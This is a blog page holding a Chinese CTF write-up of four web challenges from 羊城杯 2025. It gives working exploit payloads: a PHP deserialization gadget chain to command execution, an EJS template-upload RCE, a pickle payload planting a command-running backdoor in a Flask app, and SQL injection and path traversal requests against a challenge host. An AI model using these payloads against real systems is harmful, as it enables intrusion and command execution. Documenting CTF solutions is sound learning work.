@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>羊城杯 2025 WEB Writeup | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="羊城杯 2025 WEB Writeup - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/ycb-2025-web-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/ycb-2025-web-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/ycb-2025-web-writeup/">
+  <meta property="og:site_name" content="w8nn9z Blog">
+  <meta property="og:title" content="羊城杯 2025 WEB Writeup">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-17T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-20T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="羊城杯 2025 WEB Writeup">
+<meta name="twitter:description" content="">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://z9nn8w.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF",
+      "item": "https://z9nn8w.github.io/posts/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "羊城杯 2025 WEB Writeup",
+      "item": "https://z9nn8w.github.io/posts/ctf/ycb-2025-web-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "羊城杯 2025 WEB Writeup",
+  "name": "羊城杯 2025 WEB Writeup",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "ez_unserialize index.php：\n\u003c?php error_reporting(0); highlight_file(__FILE__); class A { public $first; public $step; public $next; public function start() { echo $this-\u003enext; } } class E { private $you; public $found; private $secret = \"admin123\"; public function __get($name){ if($name === \"secret\") { echo \"\n\".$name.\" maybe is here!\"; $this-\u003efound-\u003echeck(); } } } class F { public $fifth; public $step; public $finalstep; // u public function check() { if(preg_match(\"/U/\",$this-\u003efinalstep)) { echo \"仔细想想！\"; } else { $this-\u003estep = new $this-\u003efinalstep(); ($this-\u003estep)(); } } } class H { public $who; public $are; public $you; public function __construct() { $this-\u003eyou = \"nobody\"; } public function __destruct() { $this-\u003ewho-\u003estart(); } } class N { public $congratulation; public $yougotit; public function __call(string $func_name, array $args) { return call_user_func($func_name,$args[0]); } } class U { public $almost; public $there; public $cmd; public function __construct() { $this-\u003ethere = new N(); $this-\u003ecmd = $_POST['cmd']; } public function __invoke() { return $this-\u003ethere-\u003esystem($this-\u003ecmd); } } class V { public $good; public $keep; public $dowhat; public $go; public function __toString() { $abc = $this-\u003edowhat; $this-\u003ego-\u003e$abc; return \"\nWin!!!\"; } } unserialize($_POST['payload']); 入口点位于 H.__destruct ，出口点位于 U.__invoke ，可以从后往前构造链子\n当尝试以调用函数的方式调用一个对象时触发 __invoke 方法，所以 F.check -\u003e U.__invoke，利用php初始化类不区分大小写的特性绕过 preg_match(\"/U/\",$this-\u003efinalstep) ，将finalstep置为小写u\n绕过这一个点后，后续很自然的能找到 E.__get -\u003e F.check， 访问不可访问或未定义的属性值时会触发 __get 方法，所以 V.__toString -\u003e E.__get ，而当反序列化后的对象被输出时会触发 __toSring 方法，因此 A.start -\u003e V.__toString，最后 H.__destruct -\u003e A.start 即可完成整条链的构造：\nH.__destruct -\u003e A.start -\u003e V.__toString -\u003e E.__get -\u003e F.check -\u003e U.__invoke 完整exp：\n\u003c?php class A { public $first; public $step; public $next; public function start() { echo $this-\u003enext; } } class E { private $you; public $found; private $secret = \"admin123\"; public function __get($name){ if($name === \"secret\") { echo \"\n\".$name.\" maybe is here!\"; $this-\u003efound-\u003echeck(); } } } class F { public $fifth; public $step; public $finalstep; // u public function check() { if(preg_match(\"/U/\",$this-\u003efinalstep)) { echo \"仔细想想！\"; } else { $this-\u003estep = new $this-\u003efinalstep(); ($this-\u003estep)(); } } } class H { public $who; public $are; public $you; public function __construct() { $this-\u003eyou = \"nobody\"; } public function __destruct() { $this-\u003ewho-\u003estart(); } } class N { public $congratulation; public $yougotit; public function __call(string $func_name, array $args) { return call_user_func($func_name,$args[0]); } } class U { public $almost; public $there; public $cmd; public function __construct() { $this-\u003ethere = new N(); $this-\u003ecmd = $_POST['cmd']; } public function __invoke() { return $this-\u003ethere-\u003esystem($this-\u003ecmd); } } class V { public $good; public $keep; public $dowhat; public $go; public function __toString() { $abc = $this-\u003edowhat; $this-\u003ego-\u003e$abc; return \"\nWin!!!\"; } } $f = new F(); $f-\u003efinalstep = 'u'; $e = new E(); $e-\u003efound = $f; $v = new V(); $v-\u003edowhat = 'secret'; $v-\u003ego = $e; $a = new A(); $a-\u003enext = $v; $h = new H(); $h-\u003ewho = $a; echo urlencode(serialize($h)); staticNodeService App.js：\nconst express = require('express'); const ejs = require('ejs'); const fs = require('fs'); const path = require('path'); const app = express(); const PORT = parseInt(process.env.PORT) || 3000; app.set('view engine', 'ejs'); app.use(express.json({ limit: '1mb' })); const STATIC_DIR = path.join(__dirname, '/'); // serve index for better viewing function serveIndex(req, res) { var templ = req.query.templ || 'index'; var lsPath = path.join(__dirname, req.path); try { res.render(templ, { filenames: fs.readdirSync(lsPath), path: req.path }); } catch (e) { console.log(e); res.status(500).send('Error rendering page'); } } // static serve for simply view/download app.use(express.static(STATIC_DIR)); // Security middleware app.use((req, res, next) =\u003e { if (typeof req.path !== 'string' || (typeof req.query.templ !== 'string' \u0026\u0026 typeof req.query.templ !== 'undefined') ) res.status(500).send('Error parsing path'); else if (/js$|\\.\\./i.test(req.path)) res.status(403).send('Denied filename'); else next(); }) // logic middleware app.use((req, res, next) =\u003e { if (req.path.endsWith('/')) serveIndex(req, res); else next(); }) // Upload operation handler app.put('/*', (req, res) =\u003e { const filePath = path.join(STATIC_DIR, req.path); if (fs.existsSync(filePath)) { return res.status(500).send('File already exists'); } fs.writeFile(filePath, Buffer.from(req.body.content, 'base64'), (err) =\u003e { if (err) { return res.status(500).send('Error writing file'); } res.status(201).send('File created/updated'); }); }); // Server start app.listen(PORT, () =\u003e { console.log(`Static server is running on http://localhost:${PORT}`); }); 默认使用 index.ejs 作为模板进行渲染，STATIC_DIR 设置 /App 为根目录，对参数 templ 无任何限制，考虑上传ejs文件命令执行\n上传文件 readflag.ejs/. 可以同时绕过 req.path.endsWith('/') 以及 else if (/js$|\\.\\./i.test(req.path)) ，文件内容进行base64编码：\n\u003c%- global.process.mainModule.require('child_process').execSync('/readflag') %\u003e\rPCUtIGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCcvcmVhZGZsYWcnKSAlPg== 传参 ?templ=../readflag 来渲染 readflag.ejs执行/readflag获取flag：\nezBlog 提示用访客账号登录，猜测 guest/guest 登录成功，利用Token验证身份，Token是pickle序列化数据，一开始尝试将其中is_admin的值从False改为True，即0x89改为0x88，发现能以管理员账户登录，后续打SSTI发现失败：\n考虑到题目环境使用Token来鉴权，可能是将Token直接反序列化了，打 before_request 内存马：\ncbuiltins\reval\r(S'app.before_request_funcs.setdefault(None,[]).append(lambda:__import__(\\'os\\').popen(request.args.get(\\'cmd\\')).read())'\rtR. Ezsingin /login存在sql注入，获取Admin用户connect.sid：\nPOST /login HTTP/1.1\rHost: 45.40.247.139:30096\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rConnection: keep-alive\rUpgrade-Insecure-Requests: 1\rIf-None-Match: W/\"30c-DHNVxa0VphnTYJIjy4EiUOx4CDM\"\rPriority: u=0, i\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 32\rusername=Admin\")+--+q\u0026password=1 /download存在文件读取：\nGET /download/?filename=../app.js HTTP/1.1\rHost: 45.40.247.139:30096\rAccept-Language: zh-CN,zh;q=0.9\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\rReferer: http://45.40.247.139:30096/\rAccept-Encoding: gzip, deflate, br\rCookie: connect.sid=s%3ArQORBzH5x3cMktwmh4bOVtqMfb4WblLh.G08Vr5WzTRGs3cu7MA5ssx%2Fkcg1HCxCOJ6ymIreM5nc\rConnection: keep-alive app.js：\nconst express = require('express'); const session = require('express-session'); const sqlite3 = require('sqlite3').verbose(); const path = require('path'); const fs = require('fs'); const app = express(); const db = new sqlite3.Database('./db.sqlite'); /* FLAG in /fla4444444aaaaaagg.txt */ app.use(express.urlencoded({ extended: true })); app.use(express.static(path.join(__dirname, 'public'))); app.use(session({ secret: 'welcometoycb2025', resave: false, saveUninitialized: true, cookie: { secure: false } })); app.set('views', path.join(__dirname, 'views')); app.set('view engine', 'ejs'); const checkPermission = (req, res, next) =\u003e { if (req.path === '/login' || req.path === '/register') return next(); if (!req.session.user) return res.redirect('/login'); if (!req.session.user.isAdmin) return res.status(403).send('无权限访问'); next(); }; app.use(checkPermission); app.get('/', (req, res) =\u003e { fs.readdir(path.join(__dirname, 'documents'), (err, files) =\u003e { if (err) { console.error('读取目录时发生错误:', err); return res.status(500).send('目录读取失败'); } req.session.files = files; res.render('files', { files, user: req.session.user }); }); }); app.get('/login', (req, res) =\u003e { res.render('login'); }); app.get('/register', (req, res) =\u003e { res.render('register'); }); app.get('/upload', (req, res) =\u003e { if (!req.session.user) return res.redirect('/login'); res.render('upload', { user: req.session.user }); //todoing }); app.get('/logout', (req, res) =\u003e { req.session.destroy(err =\u003e { if (err) { console.error('退出时发生错误:', err); return res.status(500).send('退出失败'); } res.redirect('/login'); }); }); app.post('/login', async (req, res) =\u003e { const username = req.body.username; const password = req.body.password; const sql = `SELECT * FROM users WHERE (username = \"${username}\") AND password = (\"${password}\")`; db.get(sql,async (err, user) =\u003e { if (!user) { return res.status(401).send('账号密码出错！！'); } req.session.user = { id: user.id, username: user.username, isAdmin: user.is_admin }; res.redirect('/'); }); }); app.post('/register', (req, res) =\u003e { const { username, password, confirmPassword } = req.body; if (password !== confirmPassword) { return res.status(400).send('两次输入的密码不一致'); } db.exec(`INSERT INTO users (username, password) VALUES ('${username}', '${password}')`, function(err) { if (err) { console.error('注册失败:', err); return res.status(500).send('注册失败，用户名可能已存在'); } res.redirect('/login'); }); }); app.get('/download', (req, res) =\u003e { if (!req.session.user) return res.redirect('/login'); const filename = req.query.filename; if (filename.startsWith('/')||filename.startsWith('./')) { return res.status(400).send('WAF'); } if (filename.includes('../../')||filename.includes('.././')||filename.includes('f')||filename.includes('//')) { return res.status(400).send('WAF'); } if (!filename || path.isAbsolute(filename) ) { return res.status(400).send('无效文件名'); } const filePath = path.join(__dirname, 'documents', filename); if (fs.existsSync(filePath)) { res.download(filePath); } else { res.status(404).send('文件不存在'); } }); const PORT = 80; app.listen(PORT, () =\u003e { console.log(`Server running on http://localhost:${PORT}`); }); /register使用了 db.exec ，存在堆叠注入，同时观察到使用了ejs，并且/upload下不存在upload.ejs，尝试sqlite写入 upload.ejs：\ntest'); ATTACH DATABASE '/app/views/upload.ejs' AS temp; CREATE TABLE temp.pwn (data, TEXT); INSERT INTO temp.pwn (data) VALUES ('\u003c%= include(\"/fla4444444aaaaaagg.txt\") %\u003e'); -- (' 访问/upload获取flag：\n",
+  "wordCount" : "2112",
+  "inLanguage": "en",
+  "datePublished": "2025-10-17T00:00:00Z",
+  "dateModified": "2025-10-20T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://z9nn8w.github.io/posts/ctf/ycb-2025-web-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "w8nn9z Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://z9nn8w.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      羊城杯 2025 WEB Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-10-17 00:00:00 +0000 UTC'>October 17, 2025</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details >
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#ez_unserialize" aria-label="ez_unserialize">ez_unserialize</a></li>
+                    <li>
+                        <a href="#staticnodeservice" aria-label="staticNodeService">staticNodeService</a></li>
+                    <li>
+                        <a href="#ezblog" aria-label="ezBlog">ezBlog</a></li>
+                    <li>
+                        <a href="#ezsingin" aria-label="Ezsingin">Ezsingin</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+
+  <div class="post-content"><h2 id="ez_unserialize">ez_unserialize<a hidden class="anchor" aria-hidden="true" href="#ez_unserialize">#</a></h2>
+<p>index.php：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $first;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $step;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $next;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">start</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">next</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">E</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $you;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $found;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin123&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__get</span>($name){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($name <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;secret&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span><span style="color:#f92672">.</span>$name<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; maybe is here!&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">found</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">F</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $fifth;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $step;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $finalstep;  <span style="color:#75715e">// u
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/U/&#34;</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">finalstep</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;仔细想想！&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">step</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">finalstep</span>();
+</span></span><span style="display:flex;"><span>            ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">step</span>)();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">H</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $who;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $are;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $you;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">you</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nobody&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">who</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">start</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">N</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $congratulation;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $yougotit;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__call</span>(<span style="color:#a6e22e">string</span> $func_name, <span style="color:#66d9ef">array</span> $args) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">call_user_func</span>($func_name,$args[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">U</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $almost;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $there;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $cmd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">there</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">N</span>();
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]; 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">there</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">system</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cmd</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">V</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $good;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $keep;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $dowhat;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $go;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>() {
+</span></span><span style="display:flex;"><span>        $abc <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dowhat</span>;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">go</span><span style="color:#f92672">-&gt;</span>$abc;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&lt;br&gt;Win!!!&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
